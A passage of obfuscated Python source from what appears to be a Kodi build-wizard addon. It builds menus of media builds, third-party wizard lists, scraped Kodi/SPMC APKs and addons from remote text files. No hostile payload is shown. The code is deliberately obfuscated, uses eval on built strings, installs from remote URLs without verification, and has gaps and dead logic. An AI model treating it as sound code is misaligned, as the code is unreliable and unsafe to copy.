def buildMenu ():#line:2203
	if USERNAME =='':#line:2204
		ADDON .openSettings ()#line:2205
		sys .exit ()#line:2206
	if PASSWORD =='':#line:2207
		ADDON .openSettings ()#line:2208
	OO00OOOO0O00OO0OO =u_list (SPEEDFILE )#line:2209
	(OO00OOOO0O00OO0OO )#line:2210
	O0000O000O0O00000 =(wiz .workingURL (OO00OOOO0O00OO0OO ))#line:2211
	(O0000O000O0O00000 )#line:2212
	O0000O000O0O00000 =wiz .workingURL (SPEEDFILE )#line:2213
	if not O0000O000O0O00000 ==True :#line:2214
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2215
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:2216
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2217
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:2218
		addFile ('%s'%O0000O000O0O00000 ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2219
	else :#line:2220
		OOOO0O0OOO000OOOO ,OOOO00000000O00O0 ,O0000OOO00OO00OOO ,OOOOOOOO00OOO0O0O ,OO0O0OO00OO0O0O0O ,OO0O0OO0O00OO0OOO ,OO00O0O0OOO00O00O =wiz .buildCount ()#line:2221
		OO0O00OOO0000OOOO =False ;O0O0OO0O0OO00OOO0 =[]#line:2222
		if THIRDPARTY =='true':#line:2223
			if not THIRD1NAME ==''and not THIRD1URL =='':OO0O00OOO0000OOOO =True ;O0O0OO0O0OO00OOO0 .append ('1')#line:2224
			if not THIRD2NAME ==''and not THIRD2URL =='':OO0O00OOO0000OOOO =True ;O0O0OO0O0OO00OOO0 .append ('2')#line:2225
			if not THIRD3NAME ==''and not THIRD3URL =='':OO0O00OOO0000OOOO =True ;O0O0OO0O0OO00OOO0 .append ('3')#line:2226
		O00OOO000O00000OO =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:2227
		O0OO0OO00OOOOO0OO =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O00OOO000O00000OO )#line:2228
		if OOOO0O0OOO000OOOO ==1 and OO0O00OOO0000OOOO ==False :#line:2229
			for OO00O000O00OO00O0 ,OO000OOO00O000O00 ,OOOO0OOOO000O0000 ,O000O0O0OOOO000OO ,OOO0O0O0000OO00O0 ,OOO0O0O000OO0OOOO ,OO0OOO0O000000000 ,O0OOOOO000OOOO0O0 ,O00O000OOOO0O0OO0 ,O0OOOO00OOOO0O0OO in O0OO0OO00OOOOO0OO :#line:2230
				if not SHOWADULT =='true'and O00O000OOOO0O0OO0 .lower ()=='yes':continue #line:2231
				if not DEVELOPER =='true'and wiz .strTest (OO00O000O00OO00O0 ):continue #line:2232
				viewBuild (O0OO0OO00OOOOO0OO [0 ][0 ])#line:2233
				return #line:2234
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2237
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2238
		if OO0O00OOO0000OOOO ==True :#line:2239
			for OOO00OOOO000O0OO0 in O0O0OO0O0OO00OOO0 :#line:2240
				OO00O000O00OO00O0 =eval ('THIRD%sNAME'%OOO00OOOO000O0OO0 )#line:2241
		if len (O0OO0OO00OOOOO0OO )>=1 :#line:2243
			if SEPERATE =='true':#line:2244
				for OO00O000O00OO00O0 ,OO000OOO00O000O00 ,OOOO0OOOO000O0000 ,O000O0O0OOOO000OO ,OOO0O0O0000OO00O0 ,OOO0O0O000OO0OOOO ,OO0OOO0O000000000 ,O0OOOOO000OOOO0O0 ,O00O000OOOO0O0OO0 ,O0OOOO00OOOO0O0OO in O0OO0OO00OOOOO0OO :#line:2245
					if not SHOWADULT =='true'and O00O000OOOO0O0OO0 .lower ()=='yes':continue #line:2246
					if not DEVELOPER =='true'and wiz .strTest (OO00O000O00OO00O0 ):continue #line:2247
					OO0O0000O0OOOOOO0 =createMenu ('install','',OO00O000O00OO00O0 )#line:2248
					addDir ('[%s] %s (v%s)'%(float (OOO0O0O0000OO00O0 ),OO00O000O00OO00O0 ,OO000OOO00O000O00 ),'viewbuild',OO00O000O00OO00O0 ,description =O0OOOO00OOOO0O0OO ,fanart =O0OOOOO000OOOO0O0 ,icon =OO0OOO0O000000000 ,menu =OO0O0000O0OOOOOO0 ,themeit =THEME2 )#line:2249
			else :#line:2250
				if OOOOOOOO00OOO0O0O >0 :#line:2251
					O0O0O0O0OO0O0O00O ='+'if SHOW17 =='false'else '-'#line:2252
					if SHOW17 =='true':#line:2254
						for OO00O000O00OO00O0 ,OO000OOO00O000O00 ,OOOO0OOOO000O0000 ,O000O0O0OOOO000OO ,OOO0O0O0000OO00O0 ,OOO0O0O000OO0OOOO ,OO0OOO0O000000000 ,O0OOOOO000OOOO0O0 ,O00O000OOOO0O0OO0 ,O0OOOO00OOOO0O0OO in O0OO0OO00OOOOO0OO :#line:2256
							if not SHOWADULT =='true'and O00O000OOOO0O0OO0 .lower ()=='yes':continue #line:2257
							if not DEVELOPER =='true'and wiz .strTest (OO00O000O00OO00O0 ):continue #line:2258
							OO0OO0OO000O0O000 =int (float (OOO0O0O0000OO00O0 ))#line:2259
							if OO0OO0OO000O0O000 ==17 :#line:2260
								OO0O0000O0OOOOOO0 =createMenu ('install','',OO00O000O00OO00O0 )#line:2261
								addDir ('[%s] %s (v%s)'%(float (OOO0O0O0000OO00O0 ),OO00O000O00OO00O0 ,OO000OOO00O000O00 ),'viewbuild',OO00O000O00OO00O0 ,description =O0OOOO00OOOO0O0OO ,fanart =O0OOOOO000OOOO0O0 ,icon =OO0OOO0O000000000 ,menu =OO0O0000O0OOOOOO0 ,themeit =THEME2 )#line:2262
				if OO0O0OO00OO0O0O0O >0 :#line:2263
					O0O0O0O0OO0O0O00O ='+'if SHOW18 =='false'else '-'#line:2264
					if SHOW18 =='true':#line:2266
						for OO00O000O00OO00O0 ,OO000OOO00O000O00 ,OOOO0OOOO000O0000 ,O000O0O0OOOO000OO ,OOO0O0O0000OO00O0 ,OOO0O0O000OO0OOOO ,OO0OOO0O000000000 ,O0OOOOO000OOOO0O0 ,O00O000OOOO0O0OO0 ,O0OOOO00OOOO0O0OO in O0OO0OO00OOOOO0OO :#line:2268
							if not SHOWADULT =='true'and O00O000OOOO0O0OO0 .lower ()=='yes':continue #line:2269
							if not DEVELOPER =='true'and wiz .strTest (OO00O000O00OO00O0 ):continue #line:2270
							OO0OO0OO000O0O000 =int (float (OOO0O0O0000OO00O0 ))#line:2271
							if OO0OO0OO000O0O000 ==18 :#line:2272
								OO0O0000O0OOOOOO0 =createMenu ('install','',OO00O000O00OO00O0 )#line:2273
								addDir ('[%s] %s (v%s)'%(float (OOO0O0O0000OO00O0 ),OO00O000O00OO00O0 ,OO000OOO00O000O00 ),'viewbuild',OO00O000O00OO00O0 ,description =O0OOOO00OOOO0O0OO ,fanart =O0OOOOO000OOOO0O0 ,icon =OO0OOO0O000000000 ,menu =OO0O0000O0OOOOOO0 ,themeit =THEME2 )#line:2274
				if O0000OOO00OO00OOO >0 :#line:2275
					O0O0O0O0OO0O0O00O ='+'if SHOW16 =='false'else '-'#line:2276
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(O0O0O0O0OO0O0O00O ,O0000OOO00OO00OOO ),'togglesetting','show16',themeit =THEME3 )#line:2277
					if SHOW16 =='true':#line:2278
						for OO00O000O00OO00O0 ,OO000OOO00O000O00 ,OOOO0OOOO000O0000 ,O000O0O0OOOO000OO ,OOO0O0O0000OO00O0 ,OOO0O0O000OO0OOOO ,OO0OOO0O000000000 ,O0OOOOO000OOOO0O0 ,O00O000OOOO0O0OO0 ,O0OOOO00OOOO0O0OO in O0OO0OO00OOOOO0OO :#line:2279
							if not SHOWADULT =='true'and O00O000OOOO0O0OO0 .lower ()=='yes':continue #line:2280
							if not DEVELOPER =='true'and wiz .strTest (OO00O000O00OO00O0 ):continue #line:2281
							OO0OO0OO000O0O000 =int (float (OOO0O0O0000OO00O0 ))#line:2282
							if OO0OO0OO000O0O000 ==16 :#line:2283
								OO0O0000O0OOOOOO0 =createMenu ('install','',OO00O000O00OO00O0 )#line:2284
								addDir ('[%s] %s (v%s)'%(float (OOO0O0O0000OO00O0 ),OO00O000O00OO00O0 ,OO000OOO00O000O00 ),'viewbuild',OO00O000O00OO00O0 ,description =O0OOOO00OOOO0O0OO ,fanart =O0OOOOO000OOOO0O0 ,icon =OO0OOO0O000000000 ,menu =OO0O0000O0OOOOOO0 ,themeit =THEME2 )#line:2285
				if OOOO00000000O00O0 >0 :#line:2286
					O0O0O0O0OO0O0O00O ='+'if SHOW15 =='false'else '-'#line:2287
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(O0O0O0O0OO0O0O00O ,OOOO00000000O00O0 ),'togglesetting','show15',themeit =THEME3 )#line:2288
					if SHOW15 =='true':#line:2289
						for OO00O000O00OO00O0 ,OO000OOO00O000O00 ,OOOO0OOOO000O0000 ,O000O0O0OOOO000OO ,OOO0O0O0000OO00O0 ,OOO0O0O000OO0OOOO ,OO0OOO0O000000000 ,O0OOOOO000OOOO0O0 ,O00O000OOOO0O0OO0 ,O0OOOO00OOOO0O0OO in O0OO0OO00OOOOO0OO :#line:2290
							if not SHOWADULT =='true'and O00O000OOOO0O0OO0 .lower ()=='yes':continue #line:2291
							if not DEVELOPER =='true'and wiz .strTest (OO00O000O00OO00O0 ):continue #line:2292
							OO0OO0OO000O0O000 =int (float (OOO0O0O0000OO00O0 ))#line:2293
							if OO0OO0OO000O0O000 <=15 :#line:2294
								OO0O0000O0OOOOOO0 =createMenu ('install','',OO00O000O00OO00O0 )#line:2295
								addDir ('[%s] %s (v%s)'%(float (OOO0O0O0000OO00O0 ),OO00O000O00OO00O0 ,OO000OOO00O000O00 ),'viewbuild',OO00O000O00OO00O0 ,description =O0OOOO00OOOO0O0OO ,fanart =O0OOOOO000OOOO0O0 ,icon =OO0OOO0O000000000 ,menu =OO0O0000O0OOOOOO0 ,themeit =THEME2 )#line:2296
		elif OO00O0O0OOO00O00O >0 :#line:2297
			if OO0O0OO0O00OO0OOO >0 :#line:2298
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2299
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2300
			else :#line:2301
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2302
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2303
	setView ('files','viewType')#line:2304
def viewBuild (OO00OOOO00O0OO0OO ):#line:2306
	O00OO0OO00O00OOO0 =wiz .workingURL (SPEEDFILE )#line:2307
	if not O00OO0OO00O00OOO0 ==True :#line:2308
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2309
		addFile ('%s'%O00OO0OO00O00OOO0 ,'',themeit =THEME3 )#line:2310
		return #line:2311
	if wiz .checkBuild (OO00OOOO00O0OO0OO ,'version')==False :#line:2312
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2313
		addFile ('%s was not found in the builds list.'%OO00OOOO00O0OO0OO ,'',themeit =THEME3 )#line:2314
		return #line:2315
	O00000OO0O000O0O0 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2316
	OOOO0OOO0OOOO0OO0 =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OO00OOOO00O0OO0OO ).findall (O00000OO0O000O0O0 )#line:2317
	for OO0OOO0O00OOOO00O ,O000O0OOOOOO0O00O ,OO000O000OO0O00OO ,OOOOOOOO0OOO0O00O ,O000000OOOOO0OOOO ,OO000OO000OOO00OO ,OO0O0O0OO0000OO0O ,OO0O0OOO0000000O0 ,O00OOO0OOO000000O ,O000OO000O0O000OO in OOOO0OOO0OOOO0OO0 :#line:2318
		OO000OO000OOO00OO =OO000OO000OOO00OO if wiz .workingURL (OO000OO000OOO00OO )else ICON #line:2319
		OO0O0O0OO0000OO0O =OO0O0O0OO0000OO0O if wiz .workingURL (OO0O0O0OO0000OO0O )else FANART #line:2320
		O0O0OO0O0O0OO00OO ='%s (v%s)'%(OO00OOOO00O0OO0OO ,OO0OOO0O00OOOO00O )#line:2321
		if BUILDNAME ==OO00OOOO00O0OO0OO and OO0OOO0O00OOOO00O >BUILDVERSION :#line:2322
			O0O0OO0O0O0OO00OO ='%s [COLOR red][CURRENT v%s][/COLOR]'%(O0O0OO0O0O0OO00OO ,BUILDVERSION )#line:2323
		OO0O0OO0OOOO0OO00 =int (float (KODIV ));O00000OO0O0OOO000 =int (float (OOOOOOOO0OOO0O00O ))#line:2332
		if not OO0O0OO0OOOO0OO00 ==O00000OO0O0OOO000 :#line:2333
			if OO0O0OO0OOOO0OO00 ==16 and O00000OO0O0OOO000 <=15 :O0OOOO00O00OOOOOO =False #line:2334
			else :O0OOOO00O00OOOOOO =True #line:2335
		else :O0OOOO00O00OOOOOO =False #line:2336
		addFile ('התקנה','install',OO00OOOO00O0OO0OO ,'fresh',description =O000OO000O0O000OO ,fanart =OO0O0O0OO0000OO0O ,icon =OO000OO000OOO00OO ,themeit =THEME1 )#line:2340
		if not O000000OOOOO0OOOO =='http://':#line:2343
			if wiz .workingURL (O000000OOOOO0OOOO )==True :#line:2344
				addFile (wiz .sep ('THEMES'),'',fanart =OO0O0O0OO0000OO0O ,icon =OO000OO000OOO00OO ,themeit =THEME3 )#line:2345
				O00000OO0O000O0O0 =wiz .openURL (O000000OOOOO0OOOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2346
				OOOO0OOO0OOOO0OO0 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O00000OO0O000O0O0 )#line:2347
				for OOO0O0OOOOOO0OO0O ,OOO00O00O0O0OO0OO ,O0OO00OOOO0O0OOO0 ,O0O000O00O0OOOOOO ,O000O00OOOO000OO0 ,O000OO000O0O000OO in OOOO0OOO0OOOO0OO0 :#line:2348
					if not SHOWADULT =='true'and O000O00OOOO000OO0 .lower ()=='yes':continue #line:2349
					O0OO00OOOO0O0OOO0 =O0OO00OOOO0O0OOO0 if O0OO00OOOO0O0OOO0 =='http://'else OO000OO000OOO00OO #line:2350
					O0O000O00O0OOOOOO =O0O000O00O0OOOOOO if O0O000O00O0OOOOOO =='http://'else OO0O0O0OO0000OO0O #line:2351
					addFile (OOO0O0OOOOOO0OO0O if not OOO0O0OOOOOO0OO0O ==BUILDTHEME else "[B]%s (Installed)[/B]"%OOO0O0OOOOOO0OO0O ,'theme',OO00OOOO00O0OO0OO ,OOO0O0OOOOOO0OO0O ,description =O000OO000O0O000OO ,fanart =O0O000O00O0OOOOOO ,icon =O0OO00OOOO0O0OOO0 ,themeit =THEME3 )#line:2352
	setView ('files','viewType')#line:2353
def viewThirdList (OO0OO0O00OO0O0O00 ):#line:2355
	O0OOOOO0O00OO0O00 =eval ('THIRD%sNAME'%OO0OO0O00OO0O0O00 )#line:2356
	O0000OOO0000O0O0O =eval ('THIRD%sURL'%OO0OO0O00OO0O0O00 )#line:2357
	OOOO0O0O0O000OO00 =wiz .workingURL (O0000OOO0000O0O0O )#line:2358
	if not OOOO0O0O0O000OO00 ==True :#line:2359
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2360
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2361
	else :#line:2362
		O0OOOO0O00O0OO000 ,OO0000O00O0OO000O =wiz .thirdParty (O0000OOO0000O0O0O )#line:2363
		addFile ("[B]%s[/B]"%O0OOOOO0O00OO0O00 ,'',themeit =THEME3 )#line:2364
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2365
		if O0OOOO0O00O0OO000 :#line:2366
			for O0OOOOO0O00OO0O00 ,OO0OO0OO0000000OO ,O0000OOO0000O0O0O ,O000OO00000OOO000 ,OOOO00OO0OOOO0O00 ,OOOO0OO00O0O0O0O0 ,OOO0OO00O0O0OO000 ,O0O0O00O000000O00 in OO0000O00O0OO000O :#line:2367
				if not SHOWADULT =='true'and OOO0OO00O0O0OO000 .lower ()=='yes':continue #line:2368
				addFile ("[%s] %s v%s"%(O000OO00000OOO000 ,O0OOOOO0O00OO0O00 ,OO0OO0OO0000000OO ),'installthird',O0OOOOO0O00OO0O00 ,O0000OOO0000O0O0O ,icon =OOOO00OO0OOOO0O00 ,fanart =OOOO0OO00O0O0O0O0 ,description =O0O0O00O000000O00 ,themeit =THEME2 )#line:2369
		else :#line:2370
			for O0OOOOO0O00OO0O00 ,O0000OOO0000O0O0O ,OOOO00OO0OOOO0O00 ,OOOO0OO00O0O0O0O0 ,O0O0O00O000000O00 in OO0000O00O0OO000O :#line:2371
				addFile (O0OOOOO0O00OO0O00 ,'installthird',O0OOOOO0O00OO0O00 ,O0000OOO0000O0O0O ,icon =OOOO00OO0OOOO0O00 ,fanart =OOOO0OO00O0O0O0O0 ,description =O0O0O00O000000O00 ,themeit =THEME2 )#line:2372
def editThirdParty (O00O00O0O00O00O00 ):#line:2374
	OO0000OOOOOO0O00O =eval ('THIRD%sNAME'%O00O00O0O00O00O00 )#line:2375
	OO0O0OOOOO0OO00OO =eval ('THIRD%sURL'%O00O00O0O00O00O00 )#line:2376
	O0OO0O00OOOOOOO00 =wiz .getKeyboard (OO0000OOOOOO0O00O ,'Enter the Name of the Wizard')#line:2377
	O00000O0O0O0O0O0O =wiz .getKeyboard (OO0O0OOOOO0OO00OO ,'Enter the URL of the Wizard Text')#line:2378
	wiz .setS ('wizard%sname'%O00O00O0O00O00O00 ,O0OO0O00OOOOOOO00 )#line:2380
	wiz .setS ('wizard%surl'%O00O00O0O00O00O00 ,O00000O0O0O0O0O0O )#line:2381
def apkScraper (name =""):#line:2383
	if name =='kodi':#line:2384
		OOOOO0OOOOO0O0000 ='http://mirrors.kodi.tv/releases/android/arm/'#line:2385
		O00O00OOOOO00O0OO ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2386
		O00OOOOO0O0OOO000 =wiz .openURL (OOOOO0OOOOO0O0000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2387
		OOOO00OO0O0000000 =wiz .openURL (O00O00OOOOO00O0OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2388
		O00OO0000O0O0OO00 =0 #line:2389
		OOO000000O00OO00O =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O00OOOOO0O0OOO000 )#line:2390
		O0OOOO00O00OOO0OO =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OOOO00OO0O0000000 )#line:2391
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2393
		OO00OOOOOOOO000OO =False #line:2394
		for OOO0000OOOOOOOOOO ,name ,OO00OO0O0O00OOOOO ,OO00O0OOOOO000OO0 in OOO000000O00OO00O :#line:2395
			if OOO0000OOOOOOOOOO in ['../','old/']:continue #line:2396
			if not OOO0000OOOOOOOOOO .endswith ('.apk'):continue #line:2397
			if not OOO0000OOOOOOOOOO .find ('_')==-1 and OO00OOOOOOOO000OO ==True :continue #line:2398
			try :#line:2399
				O000O00O00OOOO00O =name .split ('-')#line:2400
				if not OOO0000OOOOOOOOOO .find ('_')==-1 :#line:2401
					OO00OOOOOOOO000OO =True #line:2402
					OOO0O000OOO0O00O0 ,O0000O00OO0O00OO0 =O000O00O00OOOO00O [2 ].split ('_')#line:2403
				else :#line:2404
					OOO0O000OOO0O00O0 =O000O00O00OOOO00O [2 ]#line:2405
					O0000O00OO0O00OO0 =''#line:2406
				O00O000OOO0OOOO0O ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O000O00O00OOOO00O [0 ].title (),O000O00O00OOOO00O [1 ],O0000O00OO0O00OO0 .upper (),OOO0O000OOO0O00O0 ,COLOR2 ,OO00OO0O0O00OOOOO .replace (' ',''),COLOR1 ,OO00O0OOOOO000OO0 )#line:2407
				O00OO0OO0OO0OO0O0 =urljoin (OOOOO0OOOOO0O0000 ,OOO0000OOOOOOOOOO )#line:2408
				addFile (O00O000OOO0OOOO0O ,'apkinstall',"%s v%s%s %s"%(O000O00O00OOOO00O [0 ].title (),O000O00O00OOOO00O [1 ],O0000O00OO0O00OO0 .upper (),OOO0O000OOO0O00O0 ),O00OO0OO0OO0OO0O0 )#line:2409
				O00OO0000O0O0OO00 +=1 #line:2410
			except :#line:2411
				wiz .log ("Error on: %s"%name )#line:2412
		for OOO0000OOOOOOOOOO ,name ,OO00OO0O0O00OOOOO ,OO00O0OOOOO000OO0 in O0OOOO00O00OOO0OO :#line:2414
			if OOO0000OOOOOOOOOO in ['../','old/']:continue #line:2415
			if not OOO0000OOOOOOOOOO .endswith ('.apk'):continue #line:2416
			if not OOO0000OOOOOOOOOO .find ('_')==-1 :continue #line:2417
			try :#line:2418
				O000O00O00OOOO00O =name .split ('-')#line:2419
				O00O000OOO0OOOO0O ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O000O00O00OOOO00O [0 ].title (),O000O00O00OOOO00O [1 ],O000O00O00OOOO00O [2 ],COLOR2 ,OO00OO0O0O00OOOOO .replace (' ',''),COLOR1 ,OO00O0OOOOO000OO0 )#line:2420
				O00OO0OO0OO0OO0O0 =urljoin (O00O00OOOOO00O0OO ,OOO0000OOOOOOOOOO )#line:2421
				addFile (O00O000OOO0OOOO0O ,'apkinstall',"%s v%s %s"%(O000O00O00OOOO00O [0 ].title (),O000O00O00OOOO00O [1 ],O000O00O00OOOO00O [2 ]),O00OO0OO0OO0OO0O0 )#line:2422
				O00OO0000O0O0OO00 +=1 #line:2423
			except :#line:2424
				wiz .log ("Error on: %s"%name )#line:2425
		if O00OO0000O0O0OO00 ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2426
	elif name =='spmc':#line:2427
		O0O0OO0OOO0O0O0OO ='https://github.com/koying/SPMC/releases'#line:2428
		O00OOOOO0O0OOO000 =wiz .openURL (O0O0OO0OOO0O0O0OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2429
		O00OO0000O0O0OO00 =0 #line:2430
		OOO000000O00OO00O =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (O00OOOOO0O0OOO000 )#line:2431
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2433
		for name ,OOOOOO00OO00OO0O0 in OOO000000O00OO00O :#line:2435
			O000OO000O0O00O00 =''#line:2436
			O0OOOO00O00OOO0OO =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (OOOOOO00OO00OO0O0 )#line:2437
			for O0O0O000000O000O0 ,O0O0OOO0OO0OOO00O ,OO0OOOO0OOOO0O000 in O0OOOO00O00OOO0OO :#line:2438
				if OO0OOOO0OOOO0O000 .find ('armeabi')==-1 :continue #line:2439
				if OO0OOOO0OOOO0O000 .find ('launcher')>-1 :continue #line:2440
				O000OO000O0O00O00 =urljoin ('https://github.com',O0O0O000000O000O0 )#line:2441
				break #line:2442
		if O00OO0000O0O0OO00 ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2444
def apkMenu (url =None ):#line:2446
	if url ==None :#line:2447
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2450
	if not APKFILE =='http://':#line:2451
		if url ==None :#line:2452
			O0OOOO0OOOOOO0OOO =wiz .workingURL (APKFILE )#line:2453
			O00O0O000OOOOO00O =uservar .APKFILE #line:2454
		else :#line:2455
			O0OOOO0OOOOOO0OOO =wiz .workingURL (url )#line:2456
			O00O0O000OOOOO00O =url #line:2457
		if O0OOOO0OOOOOO0OOO ==True :#line:2458
			O0O00O0OO00O0000O =wiz .openURL (O00O0O000OOOOO00O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2459
			O0000000OOO000OOO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0O00O0OO00O0000O )#line:2460
			if len (O0000000OOO000OOO )>0 :#line:2461
				O00O0OOOOO0O0O000 =0 #line:2462
				for OO00000OOOO00O00O ,O00000OOOO0OOOOO0 ,url ,O00O0O0OOO0OOOO0O ,O000OOO0OOOOOOOO0 ,O0000O00OO00OO00O ,O000000O0O0OOOO0O in O0000000OOO000OOO :#line:2463
					if not SHOWADULT =='true'and O0000O00OO00OO00O .lower ()=='yes':continue #line:2464
					if O00000OOOO0OOOOO0 .lower ()=='yes':#line:2465
						O00O0OOOOO0O0O000 +=1 #line:2466
						addDir ("[B]%s[/B]"%OO00000OOOO00O00O ,'apk',url ,description =O000000O0O0OOOO0O ,icon =O00O0O0OOO0OOOO0O ,fanart =O000OOO0OOOOOOOO0 ,themeit =THEME3 )#line:2467
					else :#line:2468
						O00O0OOOOO0O0O000 +=1 #line:2469
						addFile (OO00000OOOO00O00O ,'apkinstall',OO00000OOOO00O00O ,url ,description =O000000O0O0OOOO0O ,icon =O00O0O0OOO0OOOO0O ,fanart =O000OOO0OOOOOOOO0 ,themeit =THEME2 )#line:2470
					if O00O0OOOOO0O0O000 <1 :#line:2471
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2472
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2473
		else :#line:2474
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2475
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2476
			addFile ('%s'%O0OOOO0OOOOOO0OOO ,'',themeit =THEME3 )#line:2477
		return #line:2478
	else :wiz .log ("[APK Menu] No APK list added.")#line:2479
	setView ('files','viewType')#line:2480
def addonMenu (url =None ):#line:2482
	if not ADDONFILE =='http://':#line:2483
		if url ==None :#line:2484
			O0OO0OOOOO00O0OO0 =wiz .workingURL (ADDONFILE )#line:2485
			O00OO000OOO00OO0O =uservar .ADDONFILE #line:2486
		else :#line:2487
			O0OO0OOOOO00O0OO0 =wiz .workingURL (url )#line:2488
			O00OO000OOO00OO0O =url #line:2489
		if O0OO0OOOOO00O0OO0 ==True :#line:2490
			OO00O000OOOOO00O0 =wiz .openURL (O00OO000OOO00OO0O ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2491
			OO00OOO0O00O000OO =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO00O000OOOOO00O0 )#line:2492
			if len (OO00OOO0O00O000OO )>0 :#line:2493
				O0OOO0OO00000O0O0 =0 #line:2494
				for OOO000O00000O0OO0 ,OOO0OOOOO000O00O0 ,url ,O0OOO00OOO00O0000 ,OO0O0000OOO000O00 ,OOOO0OO00OOO00OO0 ,O0OOO00O0O0OO00OO ,O000OOOOO0O00O00O ,OO0OOO00OO0O000O0 ,OOO00000000OO00OO in OO00OOO0O00O000OO :#line:2495
					if OOO0OOOOO000O00O0 .lower ()=='section':#line:2496
						O0OOO0OO00000O0O0 +=1 #line:2497
						addDir ("[B]%s[/B]"%OOO000O00000O0OO0 ,'addons',url ,description =OOO00000000OO00OO ,icon =O0OOO00O0O0OO00OO ,fanart =O000OOOOO0O00O00O ,themeit =THEME3 )#line:2498
					else :#line:2499
						if not SHOWADULT =='true'and OO0OOO00OO0O000O0 .lower ()=='yes':continue #line:2500
						try :#line:2501
							OOO00O0O00000O00O =xbmcaddon .Addon (id =OOO0OOOOO000O00O0 ).getAddonInfo ('path')#line:2502
							if os .path .exists (OOO00O0O00000O00O ):#line:2503
								OOO000O00000O0OO0 ="[COLOR green][Installed][/COLOR] %s"%OOO000O00000O0OO0 #line:2504
						except :#line:2505
							pass #line:2506
						O0OOO0OO00000O0O0 +=1 #line:2507
						addFile (OOO000O00000O0OO0 ,'addoninstall',OOO0OOOOO000O00O0 ,O00OO000OOO00OO0O ,description =OOO00000000OO00OO ,icon =O0OOO00O0O0OO00OO ,fanart =O000OOOOO0O00O00O ,themeit =THEME2 )#line:2508
					if O0OOO0OO00000O0O0 <1 :#line:2509
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2510
			else :#line:2511
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2512
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2513
